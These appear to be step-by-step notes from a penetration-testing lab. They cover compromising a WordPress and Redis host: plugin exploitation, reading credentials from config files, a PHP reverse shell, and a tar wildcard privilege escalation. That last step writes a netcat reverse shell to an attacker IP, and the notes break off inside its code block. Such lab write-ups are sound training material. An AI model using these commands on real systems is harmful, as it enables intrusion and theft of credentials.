![image](https://github.com/user-attachments/assets/32dd8ac7-6ba1-4f6a-87e7-ca1be395707e)
![image](https://github.com/user-attachments/assets/499717f1-b319-462e-922d-3d31a78b2b23)
![image](https://github.com/user-attachments/assets/10b7f6d6-acea-4480-ab98-88d9acef6fc3)
![image](https://github.com/user-attachments/assets/1192314e-f873-45c9-87d6-ea5750eafa23)
![image](https://github.com/user-attachments/assets/6c98fc1c-32d9-4f46-b44e-4a75631947f0)
![image](https://github.com/user-attachments/assets/fbf63229-5216-46d0-91cb-62f448ed7d6a)
![image](https://github.com/user-attachments/assets/d100b004-a86b-442a-a9c4-483971588f35)
![image](https://github.com/user-attachments/assets/5988b499-5ad0-46b0-a706-0d88b98f0bd6)
![image](https://github.com/user-attachments/assets/8af331e7-a318-44c1-bfd5-5d86ec914a66)
![image](https://github.com/user-attachments/assets/786c8a9e-5d86-47fa-bd5d-341bb5542f60)
![image](https://github.com/user-attachments/assets/6dd13455-142c-4a64-9476-0361235f2f2b)
![image](https://github.com/user-attachments/assets/a90146c7-8d66-4198-9f4b-db2b600646d2)
![image](https://github.com/user-attachments/assets/58c5d2dd-25a6-4a4f-b441-425add63d2f0)
![image](https://github.com/user-attachments/assets/dfe0d4df-8b30-47ae-9ecd-693c38b04727)
![image](https://github.com/user-attachments/assets/17329205-1429-4a37-9c73-87180fd8b08a)
![image](https://github.com/user-attachments/assets/887ef54e-09ea-4a58-a8a7-3226299aced3)
![image](https://github.com/user-attachments/assets/31e434c6-d1a7-400b-893d-1c4a1d16f219)
![image](https://github.com/user-attachments/assets/da36cd67-f3db-4afe-a01a-ce6f0f113dd8)
![image](https://github.com/user-attachments/assets/ae3d11ac-cadd-4f7b-9fa3-d4d5ab9f22c8)
![image](https://github.com/user-attachments/assets/f9559a01-9ace-400b-ba28-e5b180b639dd)
![image](https://github.com/user-attachments/assets/1e8bfe2c-33b0-40c0-b815-5ac619d573ea)
![image](https://github.com/user-attachments/assets/ddffe00b-4e66-4fb2-9389-c2cf1738db85)
![image](https://github.com/user-attachments/assets/3da3ccb4-d310-4ec0-997a-e36f382c4269)
![image](https://github.com/user-attachments/assets/f9aa57d6-6449-46a2-b1e5-965417cc7447)
![image](https://github.com/user-attachments/assets/dc98b19b-3e84-43c5-bbd9-b98694de687e)
![image](https://github.com/user-attachments/assets/0d8cb718-3c8e-4d38-ba97-57811711372a)
![image](https://github.com/user-attachments/assets/1cef9b58-474c-4bd0-977d-abd8c2d355b1)
![image](https://github.com/user-attachments/assets/ca76b36b-5339-44b5-8937-c5ef35d597f6)
![image](https://github.com/user-attachments/assets/c78831d0-3da7-4447-abc1-caa9a44f1b18)
![image](https://github.com/user-attachments/assets/fecc6a50-c773-4e95-a088-e9d41d34c5e0)
![image](https://github.com/user-attachments/assets/9a0854be-5d8b-420b-9ede-94872d72e817)
![image](https://github.com/user-attachments/assets/6d4ef98c-0832-49ac-9a74-4062f54a219d)
![image](https://github.com/user-attachments/assets/78796bbc-41ed-48d1-bf9e-37e55767a2ad)
![image](https://github.com/user-attachments/assets/c87489ac-ac30-40e7-94b5-6a0ca0182233)
![image](https://github.com/user-attachments/assets/50c6dd0b-d48e-422a-b365-76188482d04f)


1. WPScan -- get user admin

2. WPScan password attack against admin, no password after 15 mins, get Plugin site editor version 1.1.1

3. Exploit-DB 44340 --> get user alice --> also redis? 

4. /etc/redis/redis.conf --> SECURITY get password

5. get exp_lin.so & redis-rce.py from https://github.com/jas502n/Redis-RCE

6. usage example https://github.com/Ridter/redis-rce    (password from redis.conf)

7. MySQL creds from /var/www/html/wp-config.php

8. netstat -tulnp --> port 3306 listen on local address

9. try MySQL database --> cannot log in, just hanging

10. ps -aux --> alice run apache2

11. find / -type d -maxdepth 4 -writable 2>/dev/null --> cannot write to /var/www/html (apache2)

12. simple php --> /tmp/test.php ---> curl to call  --> fail

13. simple php --> /run/redis/test.php ---> curl to call --> work

14. php reverse shell --> /run/redis/php-reverse-shell.php --> curl to call --> get shell as alice

15. linpeas --> Cron Job /usr/local/bin/backup.sh --> tar *

16. tar wildcard privilege escalation
    ```bash
    echo '#!/bin/bash' > exploit.sh
    echo 'nc -e /bin/sh 192.168.45.165 80' >> exploit.sh
    chmod +x exploit.sh
    touch ./"--checkpoint=1"
    touch ./"checkpoint-action=exec=bash exploit.sh"
   
